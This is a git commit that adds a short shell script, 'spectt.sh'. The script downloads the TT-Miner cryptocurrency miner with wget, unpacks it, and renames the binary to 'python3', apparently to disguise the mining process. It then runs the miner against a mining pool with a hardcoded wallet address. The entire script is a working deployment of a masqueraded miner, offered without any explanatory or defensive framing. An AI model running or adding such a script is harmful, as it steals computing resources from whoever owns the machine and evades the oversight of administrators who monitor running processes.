ed31b98a7830594e0aa2817f89f496bb09dc197c
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-08-26 19:36:11 +0700

    Create spectt.sh

---
+++ spectt.sh
@@ -0,0 +1,6 @@
+wget -O Dot https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2/TT-Miner-2024.3.2.tar.gz
+tar -xvf Dot
+cd TT-Miner-2024.3.2
+mv TT-Miner python3
+chmod +x python3
+./python3 -a spectrex -P spectre:qqnxrxajcqdu8g5d3xm6c067y2wc9wumqx6xmqwysy2e6uh5tplm7fsraha7x.luck@spr.tw-pool.com:14001
